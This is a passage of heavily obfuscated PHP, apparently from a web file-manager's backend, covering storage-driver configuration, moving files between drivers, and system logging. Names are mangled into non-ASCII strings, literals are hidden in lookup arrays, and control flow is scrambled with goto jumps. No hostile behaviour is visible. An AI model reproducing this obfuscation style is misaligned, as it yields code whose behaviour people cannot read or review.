parent::update($dç¬¯ÌºĞ[$Dñ¸±©Äò[364]], array($Dñ¸±©Äò[34] => 0)); } } } return $côå¤†ñö; goto bÍ¸ä…ëÚº; bÍ¸ä…ëÚº: } public function add($aó‰ê¼š´®) { goto AƒâÀšÒ; a¼®–˜Íî: $this->checkConfig($aó‰ê¼š´®); $D¨ø¤ô²÷ğ = parent::insert($aó‰ê¼š´®); if ($D¨ø¤ô²÷ğ && $aó‰ê¼š´®[$Cš’¡îˆíÚ[34]]) { foreach ($cÁÜÓ§¬„ as $aìŠ›˜‚á) { if ($aìŠ›˜‚á[$Cš’¡îˆíÚ[34]]) { parent::update($aìŠ›˜‚á[$Cš’¡îˆíÚ[364]], array($Cš’¡îˆíÚ[34] => 0)); } } } goto F¦½¾‚„Şœ; AƒâÀšÒ: $Cš’¡îˆíÚ =& $_SERVER[ì‹É]; $cÁÜÓ§¬„ = array_to_keyvalue(parent::listData(), $Cš’¡îˆíÚ[28]); if (isset($cÁÜÓ§¬„[$aó‰ê¼š´®[$Cš’¡îˆíÚ[28]]])) { return !1; } goto a¼®–˜Íî; F¦½¾‚„Şœ: return $D¨ø¤ô²÷ğ; goto fàğÈŸùË„; fàğÈŸùË„: } public function checkConfig(&$dµ‚á³çœ±) { goto bŠŞ˜µ›Åµ; fã³Æ¢Œ¬: $aÒ÷Ğº´Ê = $føĞ™ˆÔ›[72] . $DŸø³òÜ˜Ë; $aù¸ôÅâ = new $aÒ÷Ğº´Ê($aé³íˆ³ìÑ); if (in_array($F¥‰ŒÍ‹Å, $aù¸ôÅâ->objectDriver)) { if (!$aù¸ôÅâ->isBucketCors() && !$aù¸ôÅâ->setBucketCors()) { $AøĞÊèãÊ• = LNG($føĞ™ˆÔ›[2256]); $AøĞÊèãÊ• .= $føĞ™ˆÔ›[2257] . LNG($føĞ™ˆÔ›[2258]); show_json($AøĞÊèãÊ•, !1); } } goto D´ˆ¾’Ë±¬; bŠŞ˜µ›Åµ: $føĞ™ˆÔ› =& $_SERVER[ì‹É]; $F¥‰ŒÍ‹Å = strtolower($dµ‚á³çœ±[$føĞ™ˆÔ›[91]]); $aé³íˆ³ìÑ = json_decode_force($dµ‚á³çœ±[$føĞ™ˆÔ›[6]]); goto c›äœĞÔ°Ï; D´ˆ¾’Ë±¬: $Eê¬…ä¿êÇ = $aù¸ôÅâ->getPath($c¤Äõ”§Î . $føĞ™ˆÔ›[1897]); if (!$aù¸ôÅâ->mkfile($Eê¬…ä¿êÇ)) { show_json(LNG($føĞ™ˆÔ›[2256]), !1); } $aé³íˆ³ìÑ[$føĞ™ˆÔ›[996]] = $c¤Äõ”§Î; goto f‡Ñáá‡Á»; c›äœĞÔ°Ï: foreach ($aé³íˆ³ìÑ as $f¶ºù¢‹ˆœ => $CÁË¥Â‹‚) { $aé³íˆ³ìÑ[$f¶ºù¢‹ˆœ] = trim($CÁË¥Â‹‚); } $c¤Äõ”§Î = rtrim($aé³íˆ³ìÑ[$føĞ™ˆÔ›[996]], $føĞ™ˆÔ›[8]) . $føĞ™ˆÔ›[8]; $DŸø³òÜ˜Ë = $this->driverType($F¥‰ŒÍ‹Å); goto fã³Æ¢Œ¬; f‡Ñáá‡Á»: $dµ‚á³çœ±[$føĞ™ˆÔ›[6]] = json_encode($aé³íˆ³ìÑ); $dµ‚á³çœ±[$føĞ™ˆÔ›[91]] = $DŸø³òÜ˜Ë; return !0; goto AãºÍÇ‚ìÙ; AãºÍÇ‚ìÙ: } private function driverType($cç°¶‚ëÈ•) { $FÎ‚ºº·Ë =& $_SERVER[ì‹É]; $CÄ·«ÂÖ¦Ó = array($FÎ‚ºº·Ë[104] => $FÎ‚ºº·Ë[2259], $FÎ‚ºº·Ë[58] => $FÎ‚ºº·Ë[2260], $FÎ‚ºº·Ë[65] => $FÎ‚ºº·Ë[997]); if (isset($CÄ·«ÂÖ¦Ó[$cç°¶‚ëÈ•])) { return $CÄ·«ÂÖ¦Ó[$cç°¶‚ëÈ•]; } return strtoupper($cç°¶‚ëÈ•); } public function driverListSystem() { $F¦•ÃÏŠ»Æ =& $_SERVER[ì‹É]; $bÀ‚Ş–Ë» = parent::listData(); $F¸‹Ä¸·Ö½ = array(); foreach ($bÀ‚Ş–Ë» as $Có·®àÌœ) { unset($Có·®àÌœ[$F¦•ÃÏŠ»Æ[184]], $Có·®àÌœ[$F¦•ÃÏŠ»Æ[108]]); $Có·®àÌœ[$F¦•ÃÏŠ»Æ[6]] = json_decode_force($Có·®àÌœ[$F¦•ÃÏŠ»Æ[6]]); $F¸‹Ä¸·Ö½[] = $Có·®àÌœ; } return $F¸‹Ä¸·Ö½; } public function defaultDriver() { $f”†™œÊŒ =& $_SERVER[ì‹É]; $dò‰Á¢á°î = parent::listData(); $fƒç—±å¡© = array_filter_by_field($dò‰Á¢á°î, $f”†™œÊŒ[34], 1); $fƒç—±å¡© = $fƒç—±å¡©[0]; if ($fƒç—±å¡©) { $fƒç—±å¡©[$f”†™œÊŒ[6]] = json_decode($fƒç—±å¡©[$f”†™œÊŒ[6]], !0); } return $fƒç—±å¡©; } public function driverInfo($b½ØÒã—‡¡) { $Eó£‰‡’Ôï =& $_SERVER[ì‹É]; $BÖˆ÷°¡ë = array_to_keyvalue(parent::listData(), $Eó£‰‡’Ôï[364]); if (!isset($BÖˆ÷°¡ë[$b½ØÒã—‡¡])) { return !1; } $B´‚¯á©Œà = $BÖˆ÷°¡ë[$b½ØÒã—‡¡]; $B´‚¯á©Œà[$Eó£‰‡’Ôï[6]] = json_decode_force($B´‚¯á©Œà[$Eó£‰‡’Ôï[6]]); return $B´‚¯á©Œà; } public function removeWithFile($DË„­ÈÌó˜) { goto B¹ùÆÀ¦Ñ; B¹ùÆÀ¦Ñ: $aæñ¸Æ°Ø¸ =& $_SERVER[ì‹É]; $e™ïÏæÂğ‚ = array($aæñ¸Æ°Ø¸[710] => $DË„­ÈÌó˜); $c­‹¨øÁ½º = Model($aæñ¸Æ°Ø¸[418])->where($e™ïÏæÂğ‚)->count(); goto e•ã¦‹Ûå; a½†¢è: if (!$EêòƒÁ¢ã) { $f·Â‡Ø¶Å‡->stop($bÒµçÈÊ­); return !1; } $f·Â‡Ø¶Å‡->end(); return parent::remove($DË„­ÈÌó˜); goto fÉÊÜàì•²; aË”öÑÑ˜: $eã°âÓğö = Model($aæñ¸Æ°Ø¸[164])->where($e™ïÏæÂğ‚)->field($aæñ¸Æ°Ø¸[2264])->select(); foreach ($eã°âÓğö as $e«Œ½èéšÙ) { goto DŸ°™ƒ‚éè; aÆŠ“ñŸ: $fÄ’…ä¥÷ù = array($aæñ¸Æ°Ø¸[710] => $A¯êÏ®æÚ, $aæñ¸Æ°Ø¸[76] => $Eî æ¤‹Ò); Model($aæñ¸Æ°Ø¸[164])->where($e™ïÏæÂğ‚)->save($fÄ’…ä¥÷ù); goto eíÈä‰éÓö; DŸ°™ƒ‚éè: $f‰ÑÔ²ê‹ = $e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[76]]; $Eî æ¤‹Ò = $BÆ‰Áô” . str_replace("\173\x69\157\x3a{$DË„­ÈÌó˜}\175\57", $aæñ¸Æ°Ø¸[33], $f‰ÑÔ²ê‹); if (!IO::exist($f‰ÑÔ²ê‹)) { $FŸ‚Ìæ“²¨[] = $e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[415]]; $f·Â‡Ø¶Å‡->updateFileEnd($e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[28]], $e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[78]]); continue; } goto A²Ãµ‰Î‰¬; A²Ãµ‰Î‰¬: if (IO::exist($Eî æ¤‹Ò)) { $f·Â‡Ø¶Å‡->updateFileEnd($e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[28]], $e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[78]]); continue; } if (!IO::move($f‰ÑÔ²ê‹, get_path_father($Eî æ¤‹Ò))) { $EêòƒÁ¢ã = !1; break; } $e™ïÏæÂğ‚ = array($aæñ¸Æ°Ø¸[415] => $e«Œ½èéšÙ[$aæñ¸Æ°Ø¸[415]]); goto aÆŠ“ñŸ; eíÈä‰éÓö: } $this->removeByFileID($FŸ‚Ìæ“²¨); goto a½†¢è; B±ï‘ÅÔÌ: $BÆ‰Áô” = "\173\151\x6f\72{$A¯êÏ®æÚ}\x7d\57"; $EêòƒÁ¢ã = !0; $FŸ‚Ìæ“²¨ = array(); goto aË”öÑÑ˜; dÇî¿—Î‰: $f·Â‡Ø¶Å‡->task[$aæñ¸Æ°Ø¸[685]] = (double) $b¼Ğô®¶ ï; $bÎÈ°ÀÂ¾‹ = KodIO::defaultDriver(); $A¯êÏ®æÚ = $bÎÈ°ÀÂ¾‹[$aæñ¸Æ°Ø¸[364]]; goto B±ï‘ÅÔÌ; e•ã¦‹Ûå: $b¼Ğô®¶ ï = Model($aæñ¸Æ°Ø¸[418])->where($e™ïÏæÂğ‚)->sum($aæñ¸Æ°Ø¸[78]); $bÒµçÈÊ­ = $aæñ¸Æ°Ø¸[2261] . $DË„­ÈÌó˜; $f·Â‡Ø¶Å‡ = new TaskFileTransfer($bÒµçÈÊ­, $aæñ¸Æ°Ø¸[2262], $c­‹¨øÁ½º, LNG($aæñ¸Æ°Ø¸[2263]) . "\x28{$DË„­ÈÌó˜}\51"); goto dÇî¿—Î‰; fÉÊÜàì•²: } public function progress($DƒÏˆø½Ç») { $FÏ¯°«¯ =& $_SERVER[ì‹É]; write_log(array($FÏ¯°«¯[2265], Task::get($FÏ¯°«¯[2261] . $DƒÏˆø½Ç»))); return Task::get($FÏ¯°«¯[2261] . $DƒÏˆø½Ç»); } private function removeByFileID($b»«£ß¬ßí = array()) { goto eÜŞÙšÔ¦†; eÜŞÙšÔ¦†: $BÌƒ¨œ„Ë¾ =& $_SERVER[ì‹É]; if (empty($b»«£ß¬ßí)) { return; } $Bâ‚†°Š²¼ = array($BÌƒ¨œ„Ë¾[415] => array($BÌƒ¨œ„Ë¾[7], $b»«£ß¬ßí)); goto F˜’ääƒÚ; f”ŸìŠ³ŞÄ: foreach ($D³ÀóôÉ as $B®İ‘ƒ•¼) { Model($BÌƒ¨œ„Ë¾[379])->remove($B®İ‘ƒ•¼, !1); } goto c…ÔÉæèÉ«; F˜’ääƒÚ: $D³ÀóôÉ = Model($BÌƒ¨œ„Ë¾[1083])->where($Bâ‚†°Š²¼)->field($BÌƒ¨œ„Ë¾[366])->select(); if (!$D³ÀóôÉ) { return; } $D³ÀóôÉ = array_to_keyvalue($D³ÀóôÉ, $BÌƒ¨œ„Ë¾[33], $BÌƒ¨œ„Ë¾[366]); goto f”ŸìŠ³ŞÄ; c…ÔÉæèÉ«: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\x4c\151\x67\x68\164\x41\x70\160"; public $modelType = "\123\x79\163\x74\145\155\117\x70\x74\151\x6f\x6e"; public $field = array("\156\141\155\x65", "\x67\162\157\x75\x70", "\144\x65\x73\143", "\x63\x6f\156\164\x65\156\x74"); public function listData($e÷ÏïƒÄ¸‰ = false, $A†åÔ†éÎ = "\x6d\x6f\144\x69\x66\x79\124\151\x6d\x65", $Bô‘ÜÎó’Û = true) { return parent::listData($e÷ÏïƒÄ¸‰, $A†åÔ†éÎ, $Bô‘ÜÎó’Û); } public function remove($aÒË¯Ïİ¬¾) { $Aš ­İçÅ¾ = $this->findByName($aÒË¯Ïİ¬¾); if (!$Aš ­İçÅ¾) { return !1; } return parent::remove($Aš ­İçÅ¾[$_SERVER[ì‹É][364]]); } public function add($E¹ òï æÇ) { if ($this->findByName($E¹ òï æÇ[$_SERVER[ì‹É][28]])) { return !1; } return parent::insert($E¹ òï æÇ); } public function update($AÍ‹ÅË‡î, $eµ„Şßßæ) { $cëôÈøóªà =& $_SERVER[ì‹É]; $DÚŠËŸ¶ãŠ = $this->findByName($AÍ‹ÅË‡î); $Eó£Ÿ¹‡± = $this->findByName($eµ„Şßßæ[$cëôÈøóªà[28]]); if (!$DÚŠËŸ¶ãŠ || $Eó£Ÿ¹‡± && $Eó£Ÿ¹‡±[$cëôÈøóªà[364]] != $DÚŠËŸ¶ãŠ[$cëôÈøóªà[364]]) { return !1; } return parent::update($DÚŠËŸ¶ãŠ[$cëôÈøóªà[364]], $eµ„Şßßæ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\124\151\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\x66\165\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $b¾’Á›öÖ  =& $_SERVER[ì‹É]; return array($b¾’Á›öÖ [2266] => LNG($b¾’Á›öÖ [2267]), $b¾’Á›öÖ [2268] => LNG($b¾’Á›öÖ [2269]), $b¾’Á›öÖ [1955] => LNG($b¾’Á›öÖ [2270]), $b¾’Á›öÖ [2271] => LNG($b¾’Á›öÖ [2272]), $b¾’Á›öÖ [2273] => LNG($b¾’Á›öÖ [2274]), $b¾’Á›öÖ [2275] => LNG($b¾’Á›öÖ [2276]), $b¾’Á›öÖ [2277] => LNG($b¾’Á›öÖ [2278]), $b¾’Á›öÖ [2279] => LNG($b¾’Á›öÖ [2280]), $b¾’Á›öÖ [1986] => LNG($b¾’Á›öÖ [2281]), $b¾’Á›öÖ [2282] => LNG($b¾’Á›öÖ [2283]), $b¾’Á›öÖ [2284] => LNG($b¾’Á›öÖ [2285]), $b¾’Á›öÖ [2286] => LNG($b¾’Á›öÖ [2287]), $b¾’Á›öÖ [2288] => LNG($b¾’Á›öÖ [2289]), $b¾’Á›öÖ [1984] => LNG($b¾’Á›öÖ [2290]), $b¾’Á›öÖ [1989] => LNG($b¾’Á›öÖ [2291]), $b¾’Á›öÖ [2292] => LNG($b¾’Á›öÖ [2293]), $b¾’Á›öÖ [2294] => LNG($b¾’Á›öÖ [2295]), $b¾’Á›öÖ [2296] => LNG($b¾’Á›öÖ [2297]), $b¾’Á›öÖ [2298] => LNG($b¾’Á›öÖ [2299]), $b¾’Á›öÖ [1992] => LNG($b¾’Á›öÖ [2300]), $b¾’Á›öÖ [1993] => LNG($b¾’Á›öÖ [2301]), $b¾’Á›öÖ [2302] => LNG($b¾’Á›öÖ [2303]), $b¾’Á›öÖ [2304] => LNG($b¾’Á›öÖ [2305]), $b¾’Á›öÖ [2306] => LNG($b¾’Á›öÖ [2307]), $b¾’Á›öÖ [2308] => LNG($b¾’Á›öÖ [2309]), $b¾’Á›öÖ [2310] => LNG($b¾’Á›öÖ [2311]), $b¾’Á›öÖ [1987] => LNG($b¾’Á›öÖ [2312]), $b¾’Á›öÖ [2313] => LNG($b¾’Á›öÖ [2314]), $b¾’Á›öÖ [2315] => LNG($b¾’Á›öÖ [2316]), $b¾’Á›öÖ [2317] => LNG($b¾’Á›öÖ [2317]), $b¾’Á›öÖ [2318] => LNG($b¾’Á›öÖ [1959]), $b¾’Á›öÖ [2319] => LNG($b¾’Á›öÖ [2320]), $b¾’Á›öÖ [2321] => LNG($b¾’Á›öÖ [2322]), $b¾’Á›öÖ [2323] => LNG($b¾’Á›öÖ [2324]), $b¾’Á›öÖ [2325] => LNG($b¾’Á›öÖ [2326]), $b¾’Á›öÖ [2327] => LNG($b¾’Á›öÖ [2327]), $b¾’Á›öÖ [2328] => LNG($b¾’Á›öÖ [2329]), $b¾’Á›öÖ [2330] => LNG($b¾’Á›öÖ [2331]), $b¾’Á›öÖ [2332] => LNG($b¾’Á›öÖ [2333]), $b¾’Á›öÖ [2334] => LNG($b¾’Á›öÖ [2335]), $b¾’Á›öÖ [2336] => LNG($b¾’Á›öÖ [2337]), $b¾’Á›öÖ [2338] => LNG($b¾’Á›öÖ [2339])); } private function typeFile() { $bŸØœÎÄØ =& $_SERVER[ì‹É]; $d­©òºô»à = array($bŸØœÎÄØ[1989] => array($bŸØœÎÄØ[1990]), $bŸØœÎÄØ[2286] => array($bŸØœÎÄØ[2340]), $bŸØœÎÄØ[2288] => array($bŸØœÎÄØ[2341]), $bŸØœÎÄØ[1984] => array($bŸØœÎÄØ[1985]), $bŸØœÎÄØ[2294] => array(), $bŸØœÎÄØ[2296] => array(), $bŸØœÎÄØ[2298] => array(), $bŸØœÎÄØ[1992] => array($bŸØœÎÄØ[1994]), $bŸØœÎÄØ[1993] => array($bŸØœÎÄØ[1994]), $bŸØœÎÄØ[2302] => array($bŸØœÎÄØ[2342]), $bŸØœÎÄØ[2304] => array($bŸØœÎÄØ[2342]), $bŸØœÎÄØ[2306] => array($bŸØœÎÄØ[2343]), $bŸØœÎÄØ[2292] => array($bŸØœÎÄØ[2344]), $bŸØœÎÄØ[2308] => array($bŸØœÎÄØ[2345]), $bŸØœÎÄØ[2310] => array($bŸØœÎÄØ[2346]), $bŸØœÎÄØ[1987] => array($bŸØœÎÄØ[1988])); return $d­©òºô»à; } private function typeAll() { goto b¦„Ì†Õìª; fŞïÜ¾Ü«ƒ: foreach ($Bíõ²¬¼Óš as $cÛí«ï×çŠ => $D½«†‡¶…•) { $d„©Âï¸¾æ[$D½«†‡¶…•[0]] = $d„©Âï¸¾æ[$cÛí«ï×çŠ]; } $d„©Âï¸¾æ[$AÛóöëŸ¶“[1994]] = LNG($AÛóöëŸ¶“[2347]); $d„©Âï¸¾æ[$AÛóöëŸ¶“[2342]] = LNG($AÛóöëŸ¶“[2348]); goto eŠËÚÜŠ‡; b¦„Ì†Õìª: $AÛóöëŸ¶“ =& $_SERVER[ì‹É]; $d„©Âï¸¾æ = $this->typeList; $Bíõ²¬¼Óš = array_filter($this->typeFile()); goto fŞïÜ¾Ü«ƒ; eŠËÚÜŠ‡: return $d„©Âï¸¾æ; goto f±ÚÉã­ç; f±ÚÉã­ç: } public function addLog($Dí‘ç®¯ã¹, $A»Ôš¼‚©¤ = array()) { goto AÍ¿ĞÇ‘Ìá; eì­¤‰¦Ç¨: parent::add($A»Ôš¼‚©¤); goto Bõ‰ŸïëÒ; E‘äï¢ªœ: $eÅ÷ö†ßÀ = get_client_ip(); if (!$A»Ôš¼‚©¤ || strlen(json_encode($A»Ôš¼‚©¤)) >= 1024) { $A»Ôš¼‚©¤ = array($DÕŞ‹Û‡ˆ[2349] => $eÅ÷ö†ßÀ); } else { if (is_array($A»Ôš¼‚©¤)) { $A»Ôš¼‚©¤[$DÕŞ‹Û‡ˆ[2349]] = $eÅ÷ö†ßÀ; } else { $A»Ôš¼‚©¤ = array($DÕŞ‹Û‡ˆ[1008] => $A»Ôš¼‚©¤, $DÕŞ‹Û‡ˆ[2349] => $eÅ÷ö†ßÀ); } } $A»Ôš¼‚©¤ = array($DÕŞ‹Û‡ˆ[1341] => Session::sign(), $DÕŞ‹Û‡ˆ[1342] => $e£ìºÍ‡âî, $DÕŞ‹Û‡ˆ[29] => $Dí‘ç®¯ã¹, $DÕŞ‹Û‡ˆ[1344] => json_encode($A»Ôš¼‚©¤)); goto eì­¤‰¦Ç¨; AÍ¿ĞÇ‘Ìá: $DÕŞ‹Û‡ˆ =& $_SERVER[ì‹É]; if (!isset($this->typeList[$Dí‘ç®¯ã¹])) { return; } $e£ìºÍ‡âî = USER_ID ? USER_ID : (isset($A»Ôš¼‚©¤[$DÕŞ‹Û‡ˆ[1351]]) ? $A»Ôš¼‚©¤[$DÕŞ‹Û‡ˆ[1351]] : 0); goto E‘äï¢ªœ; Bõ‰ŸïëÒ: } public function remove($D‚ˆä×ô½‰) { $this->where(array($_SERVER[ì‹É][382] => $D‚ˆä×ô½‰))->delete(); } private function _makeOrder($eâ–ÁÙ = '') { goto b“ÚªÁßÛ‚; D¦Íç•â: $a£¥ê”Ïšº = Input::get($bË¸ŒÖØ[404], $bË¸ŒÖØ[7], $bË¸ŒÖØ[2150], array($bË¸ŒÖØ[2091], $bË¸ŒÖØ[400])); $a£¥ê”Ïšº = $Fˆœğöçœ¾[$a£¥ê”Ïšº]; $eâ–ÁÙ = $eâ–ÁÙ . "{$FÇĞ‚íñ—}\40{$a£¥ê”Ïšº}"; goto dº‹ÄÎã¡“; dº‹ÄÎã¡“: return $this->order($eâ–ÁÙ); goto e’¦˜Û½ù¯; b“ÚªÁßÛ‚: $bË¸ŒÖØ =& $_SERVER[ì‹É]; $FÇĞ‚íñ— = $bË¸ŒÖØ[184]; $Fˆœğöçœ¾ = array($bË¸ŒÖØ[398] => $bË¸ŒÖØ[399], $bË¸ŒÖØ[400] => $bË¸ŒÖØ[401]); goto D¦Íç•â; e’¦˜Û½ù¯: } public function get($Bá¶•ÓÌŠ = '') { goto AêÏñ‰®É’; dÅ¥‰º÷ø©: if (!empty($Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[2349]])) { $B²–‚ ÃÛ[$A¤¶°¯Œ‹½[401]] = array($A¤¶°¯Œ‹½[756], "\45{$Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[2349]]}\x25"); } $cÕì ¶ÒÑ± = $this->_makeOrder()->where($B²–‚ ÃÛ)->selectPage(); if (empty($cÕì ¶ÒÑ±[$A¤¶°¯Œ‹½[350]])) { show_json(array(), !0, $cÕì ¶ÒÑ±[$A¤¶°¯Œ‹½[347]]); } goto a¯«²Õ¡ÕÅ; AêÏñ‰®É’: $A¤¶°¯Œ‹½ =& $_SERVER[ì‹É]; if (!$Bá¶•ÓÌŠ) { show_json(array()); } $B²–‚ ÃÛ = array(); goto fœ±Œ„§Öâ; fœ±Œ„§Öâ: if ($Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[1351]]) { $B²–‚ ÃÛ[$A¤¶°¯Œ‹½[1351]] = $Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[1351]]; } if (isset($Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[689]])) { $FÊÚçí„ = $Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[689]]; $b·¿§ÔÇ• = isset($Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[690]]) ? $Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[690]] : time(); $B²–‚ ÃÛ[$A¤¶°¯Œ‹½[184]] = array($A¤¶°¯Œ‹½[318], array($FÊÚçí„, $b·¿§ÔÇ•)); } if ($Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[29]]) { $DáãÃ´½äÌ = explode($A¤¶°¯Œ‹½[47], $Bá¶•ÓÌŠ[$A¤¶°¯Œ‹½[29]]); $c¿È³¼»ÁØ = $this->typeFile(); $Dõ±ÚºŠ½Æ = array(); foreach ($DáãÃ´½äÌ as $a¼øƒ±¸ë) { $Dõ±ÚºŠ½Æ[] = $a¼øƒ±¸ë; if (isset($c¿È³¼»ÁØ[$a¼øƒ±¸ë])) { $Dõ±ÚºŠ½Æ = array_merge($Dõ±ÚºŠ½Æ, $c¿È³¼»ÁØ[$a¼øƒ±¸ë]); } } $Dõ±ÚºŠ½Æ = array_unique($Dõ±ÚºŠ½Æ); if ($Dõ±ÚºŠ½Æ) { $B²–‚ ÃÛ[$A¤¶°¯Œ‹½[29]] = array($A¤¶°¯Œ‹½[7], $Dõ±ÚºŠ½Æ); } } goto dÅ¥‰º÷ø©; a¯«²Õ¡ÕÅ: $cÕì ¶ÒÑ±[$A¤¶°¯Œ‹½[350]] = $this->logList($cÕì ¶ÒÑ±[$A¤¶°¯Œ‹½[350]]); return $cÕì ¶ÒÑ±; goto eÅ®£¥æÜÁ; eÅ®£¥æÜÁ: } private function ipAddress(&$Bêó„Ø—õ™) { $eåëŸóæâõ =& $_SERVER[ì‹É]; if (!empty($Bêó„Ø—õ™[$eåëŸóæâõ[2349]])) { $e¥½÷‹¶™ = IpLocation::get($Bêó„Ø—õ™[$eåëŸóæâõ[2349]]); if ($e¥½÷‹¶™ == $eåëŸóæâõ[2350]) { $e¥½÷‹¶™ = $eåëŸóæâõ[2351]; } } else { $e¥½÷‹¶™ = LNG($eåëŸóæâõ[2352]); } $Bêó„Ø—õ™[$eåëŸóæâõ[2353]] = $e¥½÷‹¶™; } private function getSourceList(&$eãøñ’œˆ) { $dÄØàë™— =& $_SERVER[ì‹É]; $F…Îˆ‰‡ = array(); foreach ($eãøñ’œˆ as $aåÜÃ«§¦ => $D¶ÉµíÎ) { $bà¶¹½÷‘Ú = json_decode($D¶ÉµíÎ[$dÄØàë™—[401]], !0); if (strpos($D¶ÉµíÎ[$dÄØàë™—[29]], $dÄØàë™—[2185]) !== 0) { goto b»ƒİÄ„ñ; e¨Èïğñà²: $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[366]] = $c•ˆÔË¸™™[$dÄØàë™—[366]]; $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[2184]] = $c•ˆÔË¸™™[$dÄØàë™—[457]]; $eãøñ’œˆ[$aåÜÃ«§¦][$dÄØàë™—[401]] = json_encode($bà¶¹½÷‘Ú); goto CõÏòíŞ÷; b»ƒİÄ„ñ: if (!isset($bà¶¹½÷‘Ú[$dÄØàë™—[76]]) || strpos($D¶ÉµíÎ[$dÄØàë™—[29]], $dÄØàë™—[2354]) !== 0) { continue; } if (!IO::init($bà¶¹½÷‘Ú[$dÄØàë™—[76]])) { continue; } if (!($c•ˆÔË¸™™ = IO::infoFull($bà¶¹½÷‘Ú[$dÄØàë™—[76]]))) { continue; } goto e¨Èïğñà²; CõÏòíŞ÷: continue; goto CñÑ›šö²…; CñÑ›šö²…: } $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[366]]; $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[2184]]; if ($bà¶¹½÷‘Ú[$dÄØàë™—[29]] == $dÄØàë™—[484]) { $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[401]][$dÄØàë™—[979]]; $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[401]][$dÄØàë™—[980]]; } if ($bà¶¹½÷‘Ú[$dÄØàë™—[29]] == $dÄØàë™—[2192]) { $F…Îˆ‰‡[] = $bà¶¹½÷‘Ú[$dÄØàë™—[401]][$dÄØàë™—[366]]; } } if (!$F…Îˆ‰‡) { return array(); } return Model($dÄØàë™—[757])->sourceListInfo($F…Îˆ‰‡, !0); } private function logList($AÊƒ£óÔÆö) { goto EÜÑ¡šß‰Ú; dÌ’äÚ˜: return $F¥ ê¾Û¡Ó; goto eº¶¯øÜÆã; aƒÀ¯ŸÏ† : $Fù’´ùÉŒß = $this->getSourceList($AÊƒ£óÔÆö); $Cã‘Éë±ê™ = $this->typeAll(); $F¥ ê¾Û¡Ó = array(); goto CØ½Ğ¦ÚÁ»; CØ½Ğ¦ÚÁ»: $Fà¡ÌÔ‰ = array(); foreach ($AÊƒ£óÔÆö as $B¥Œ†é˜ö˜ => $aõÂÆĞ´’É) { goto FœĞîøŠê…; FœĞîøŠê…: $F¹É»å¿Â  = $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[29]]; $bÖ½¡ë¦— = isset($CáŸæÏŸ‡á[$aõÂÆĞ´’É[$bŠÑÈÜˆĞ[1351]]]) ? $CáŸæÏŸ‡á[$aõÂÆĞ´’É[$bŠÑÈÜˆĞ[1351]]] : !1; $F“¤ªğ‰­ = strpos($F¹É»å¿Â , $bŠÑÈÜˆĞ[2355]) == 0 ? LNG($bŠÑÈÜˆĞ[2356]) : LNG($bŠÑÈÜˆĞ[2352]); goto b±ºÌ“¬­Ú; D¥Î‡â¹É: $this->ipAddress($aõÂÆĞ´’É); if (strpos($F¹É»å¿Â , $bŠÑÈÜˆĞ[2185]) === 0 || isset($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2184]])) { goto fÓ¨®ÈàÏ‰; f§•¾–Øì’: if ($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2197]] && $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2197]][$bŠÑÈÜˆĞ[368]] == $bŠÑÈÜˆĞ[1053]) { $Fà¡ÌÔ‰[] = $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[364]]; unset($AÊƒ£óÔÆö[$B¥Œ†é˜ö˜]); continue; } goto b³íÎ½Ü‹; CÃŒÊáÜÕÊ: if ($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[29]] == $bŠÑÈÜˆĞ[2192]) { $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[401]][$bŠÑÈÜˆĞ[366]] = $Fù’´ùÉŒß[$F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[401]][$bŠÑÈÜˆĞ[366]]]; } if ($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[29]] == $bŠÑÈÜˆĞ[1982]) { $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2197]] = $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[388]]; $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2184]] = $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2197]][$bŠÑÈÜˆĞ[366]]; $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[388]] = !1; $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[366]] = $bŠÑÈÜˆĞ[33]; } if ($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[388]] && $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[388]][$bŠÑÈÜˆĞ[368]] == $bŠÑÈÜˆĞ[1053]) { $Fà¡ÌÔ‰[] = $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[364]]; 